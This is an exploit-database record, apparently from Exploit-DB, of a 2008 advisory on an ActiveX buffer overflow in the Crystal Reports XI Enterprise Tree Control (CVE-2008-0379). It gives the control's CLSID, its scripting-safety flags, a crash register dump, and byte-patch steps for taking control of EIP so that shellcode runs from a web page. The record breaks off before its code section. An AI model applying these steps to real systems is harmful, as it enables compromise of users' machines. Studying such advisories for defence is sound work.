{
    "text": "published_time: 2008-01-17 ， id: 5382 ， eid: 4931 ， cve: CVE-2008-0379 ， title: Crystal Reports XI Release 2 (Enterprise Tree Control) - ActiveX Buffer Overflow (Denial of Service) (PoC) - Windows dos Exploit ， author: shinnai ， published_time: 2008-01-17 ， verified: Verified ， platform: Windows ， exploit_type: dos ， exploit_url: /download/4931 ， exploit_detail: \r ， Application:  Crystal Reports XI Release 2 (Enterprise Tree Control) Remote BoF/Dos\r ，               www.businessobjects.com\r ， Versions:     11\r ， Platforms:    Windows XP Professional\r ， Bug:          buffer-overflow\r ， Exploitation: remote\r ， Date:         2007-01-16\r ， Author:       shinnai\r ，               e-mail: shinnai[at]autistici[dot]org\r ，               web:    \r ， 1) Introduction\r ， 2) Technical details and bug\r ， 3) The Code\r ， 4) Fix\r ， 1) Introduction\r ， This component is used to visualize on the web reports created with\r ， Crystal Reports\r ， 2) Technical details and bug\r ， Name:\tEnterpriseControls.dll\r ， Ver.:\t11.5.0.313\r ， CLSID:\t{3D58C9F3-7CA5-4C44-9D62-C5B63E059050}\r ， MD5:\t179e2dc7f9f6e9d6e0210e89c623fd72\r ， Marked as:\r ， RegKey Safe for Script: True\r ， RegKey Safe for Init: True\r ， Implements IObjectSafety: True\r ， IDisp Safe: Safe for untrusted: caller,data\r ， IPStorage Safe: Safe for untrusted: caller,data\r ， The problem is a buffer-overflow which occours when you use the\r ， \"SelectedSession()\" method.\r ， It seems that, during the initialization of the component, a race\r ， condition occours between threads and 4 bytes of the same component\r ， will overwrite EIP.\r ， If you patch these 4 bytes, you can control this register, using\r ， it to jump to a shellcode and execute arbitrary code on user's pc.\r ， For exploiting this vulnerability you only need to create a web\r ， page containing the CLSID and the codebase path to your crafted\r ， ActiveX.\r ， These are registers using the original file:\r ， 14:59:34.126  pid=1468 tid=1250  EXCEPTION (first-chance)\r ，               Exception C0000005 (ACCESS_VIOLATION reading [FF7DE928])\r ，               EAX=5A4472D4: 83 6C 24 04 28 E9 7D FF-FF FF 83 6C 24 04 2C E9\r ，               EBX=036B68CC: 44 C7 4D 5A 28 C7 4D 5A-00 C7 4D 5A D4 C6 4D 5A\r ，               ECX=5A4DC55C: D4 72 44 5A 65 6C 44 5A-6F 6C 44 5A E4 6F 44 5A\r ，               EDX=5A4DC55C: D4 72 44 5A 65 6C 44 5A-6F 6C 44 5A E4 6F 44 5A\r ，               ESP=01FCF3A8: B4 3B 43 5A 5C C5 4D 5A-C8 F7 44 5A 68 F4 FC 01\r ，               EBP=01FCF3D4: 5C F4 FC 01 77 01 45 5A-68 F4 FC 01 54 F7 07 03\r ，               ESI=5A4DE140: 79 3A 5C 66 72 61 6D 65-77 6F 72 6B 5F 73 64 6B\r ，               EDI=036B68F4: 5C C5 4D 5A 44 C5 4D 5A-01 00 00 00 30 C5 4D 5A\r ，               EIP=FF7DE928: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??\r ，                             --> N/A\r ， 14:59:34.142  pid=1468 tid=1250  EXCEPTION (unhandled)\r ，               Exception C0000005 (ACCESS_VIOLATION reading [FF7DE928])\r ，               EAX=5A4472D4: 83 6C 24 04 28 E9 7D FF-FF FF 83 6C 24 04 2C E9\r ，               EBX=036B68CC: 44 C7 4D 5A 28 C7 4D 5A-00 C7 4D 5A D4 C6 4D 5A\r ，               ECX=5A4DC55C: D4 72 44 5A 65 6C 44 5A-6F 6C 44 5A E4 6F 44 5A\r ，               EDX=5A4DC55C: D4 72 44 5A 65 6C 44 5A-6F 6C 44 5A E4 6F 44 5A\r ，               ESP=01FCF3A8: B4 3B 43 5A 5C C5 4D 5A-C8 F7 44 5A 68 F4 FC 01\r ，               EBP=01FCF3D4: 5C F4 FC 01 77 01 45 5A-68 F4 FC 01 54 F7 07 03\r ，               ESI=5A4DE140: 79 3A 5C 66 72 61 6D 65-77 6F 72 6B 5F 73 64 6B\r ，               EDI=036B68F4: 5C C5 4D 5A 44 C5 4D 5A-01 00 00 00 30 C5 4D 5A\r ，               EIP=FF7DE928: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??\r ，                             --> N/A\r ， We'll find these 4 bytes at this address:\r ， 0x000172D8 \"28 E9 7D FF\"...\r ， using an hex editor to modify to:\r ， 0x000172D8 \"42 42 42 42\"...\r ， we'll have:"
}